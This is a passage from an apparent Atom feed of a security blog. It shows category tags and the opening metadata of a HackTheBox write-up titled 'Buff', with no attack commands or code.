+&lt;p&gt;I clearly recommend this box for an "unexpected" journey.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="phishing"></category><category term="pypi"></category></entry><entry><title>HTB: Buff</title><link href="https://maggick.fr/2020/11/htb-buff.html" rel="alternate"></link><published>2020-11-22T12:41:00+01:00</published><updated>2020-11-22T12:41:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-22:/2020/11/htb-buff.html</id><summary type="html">&lt;p&gt;&lt;img alt="Buff card" class="align-left" src="/media/2020.11/buff_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/263"&gt;Buff&lt;/a&gt; published on
 July 18 2020
